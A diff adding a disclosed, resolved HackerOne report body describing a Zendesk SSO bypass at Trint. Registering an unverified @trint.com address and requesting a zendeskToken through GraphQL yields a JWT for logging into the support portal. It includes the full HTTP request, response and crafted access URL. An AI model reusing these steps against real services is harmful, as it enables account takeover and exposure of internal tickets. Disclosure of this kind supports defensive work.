@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Improper Authentication - Generic"
 enriched: true
+body: true
 date: 2020-08-24
 submitted: 2019-11-11T12:36:00.343Z
 bounty_usd: null
@@ -25,6 +26,66 @@ title: "SSO bypass in zendesk using trint organization able to leak internal tic
 - Report: [https://hackerone.com/reports/734936](https://hackerone.com/reports/734936)
 - CWE: Improper Authentication - Generic
 - Submitted: 2019-11-11T12:36:00.343Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+#Summary
+hello there because in `app.trint.com` there's no email verification i able to login in your `zendesk SSO` using your organization
+your organization using domain `*@trint.com` because there's no email verification i able to read and takeover + claim this email
+`support+1@trint.com` and i able to login in zendesk SSO using that email.
+
+#How to reproduce
+* i registered in `app.trint.com` using this email `support+1@trint.com` until registration step finish
+* i check my burp history there's a `graphql` request in this host `https://graphql2.trint.com/`
+* i use this query
+
+```
+POST / HTTP/1.1
+Host: graphql2.trint.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://app.trint.com/
+content-type: application/json
+Authorization: Bearer [REDACTED-JWT]
+X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
+X-Trint-Super-Properties: {}
+Origin: https://app.trint.com
+Content-Length: 111
+Connection: close
+
+{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
+```
+
+>response header
+```
+HTTP/1.1 200 OK
+Date: Mon, 11 Nov 2019 12:17:06 GMT
+Content-Type: application/json
+Content-Length: 272
+Connection: close
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Vary: Accept-Encoding
+
+{"data":{"zendeskToken":"[REDACTED-JWT]"}}
+```
+
+* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=[REDACTED-JWT]`
+
+* boom logged in in ticket using email `support+1@trint.com`
+
+#POC
+
+{F631462}
+
+## Impact
+
+#Impact
+* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`
 
 ## Timeline
 
